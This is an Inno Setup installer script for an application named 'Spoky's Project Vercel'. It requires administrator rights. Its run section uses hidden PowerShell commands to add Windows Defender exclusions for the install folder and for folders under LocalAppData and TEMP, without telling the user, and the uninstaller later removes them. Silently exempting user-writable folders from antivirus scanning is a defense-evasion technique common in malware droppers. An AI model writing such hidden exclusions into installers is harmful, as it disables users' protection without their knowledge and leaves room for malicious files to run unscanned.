[Setup]
AppName=Spoky's Project Vercel
AppVersion=1.1.0
AppPublisher=Spoky
DefaultDirName={autopf}\SpokysPL
DefaultGroupName=Spoky's Project Vercel
UninstallDisplayIcon={app}\SpokysProjectVercel.exe
Compression=lzma2
SolidCompression=yes
OutputDir=D:\Spoky's Project Lightning
OutputBaseFilename=SpokysPL-v1.1-Setup
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64compatible
DisableProgramGroupPage=yes

[Languages]
Name: english; MessagesFile: compiler:Default.isl

[Tasks]
Name: desktopicon; Description: Create a &desktop shortcut; GroupDescription: Additional shortcuts:

[Files]
Source: "D:\Spoky's Project Lightning\Publish\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
Name: "{group}\Spoky's Project Vercel"; Filename: "{app}\SpokysProjectVercel.exe"; WorkingDir: "{app}"
Name: "{autodesktop}\Spoky's Project Vercel"; Filename: "{app}\SpokysProjectVercel.exe"; WorkingDir: "{app}"; Tasks: desktopicon
Name: "{group}\Uninstall Spoky's Project Vercel"; Filename: "{uninstallexe}"

[Run]
Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden
Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{localappdata}\SpokysPL' -ErrorAction SilentlyContinue"""; Flags: runhidden
Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{%TEMP}\SpokysPL' -ErrorAction SilentlyContinue"""; Flags: runhidden
Filename: "{app}\SpokysProjectVercel.exe"; Description: "Launch Spoky's Project Vercel"; Flags: postinstall nowait skipifsilent

[UninstallRun]
Filename: "powershell.exe"; Parameters: "-Command ""Remove-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden
Filename: "powershell.exe"; Parameters: "-Command ""Remove-MpPreference -ExclusionPath '{localappdata}\SpokysPL' -ErrorAction SilentlyContinue"""; Flags: runhidden
Filename: "powershell.exe"; Parameters: "-Command ""Remove-MpPreference -ExclusionPath '{%TEMP}\SpokysPL' -ErrorAction SilentlyContinue"""; Flags: runhidden
